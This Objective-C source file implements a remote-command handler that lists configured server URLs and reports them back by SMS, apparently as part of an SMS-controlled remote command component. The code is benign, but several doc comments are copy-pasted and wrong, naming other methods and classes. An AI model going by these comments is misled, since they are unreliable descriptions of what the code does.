/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  QueryURLProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  24/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "QueryURLProcessor.h"
#import "ServerAddressManager.h"

@interface QueryURLProcessor (PrivateAPI)
- (void) sendReplySMSWithResult: (NSString *) aResult; 
- (void) processQueryURL;
@end

@implementation QueryURLProcessor

/**
 - Method name: init
 - Purpose:This method is used to initialize the LocationOnDemandProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData),aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description: No return type
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"QueryURLProcessor--->initWithRemoteCommandData...");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the LocationOnDemandProcessor
 - Argument list and description: 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"QueryURLProcessor--->doProcessingCommand")
	[self processQueryURL];
}


#pragma mark AddURLProcessor Private Methods

/**
 - Method name: processRestartDevice
 - Purpose:This method is used to Restart Devoce
 - Argument list and description: No Return Type
 - Return description: mRemoteCmdCode (NSString *)
*/

- (void) processQueryURL {
	DLog (@"QueryURLProcessor--->processQueryURL")
	id <ServerAddressManager> serverManager=[[RemoteCmdUtils sharedRemoteCmdUtils] mServerAddressManager];
	NSArray *URLs=[serverManager userURLs];
	NSString *result=NSLocalizedString(@"kQueryURL", @"");
	for (NSString *url in URLs) {
		result=[result stringByAppendingString:@"\n"];
		result=[result stringByAppendingString:url];
	}
	[self sendReplySMSWithResult:result];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
*/

- (void) sendReplySMSWithResult:(NSString *) aResult {
	DLog (@"QueryURLProcessor--->processQueryURL")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
															    					  andErrorCode:_SUCCESS_];
	NSString *queryURLMessage=[NSString stringWithFormat:@"%@%@",messageFormat,aResult];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:queryURLMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
														       andMessage:queryURLMessage];
	}
}

/*
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
 */

-(void) dealloc {
	[super dealloc];
}


@end
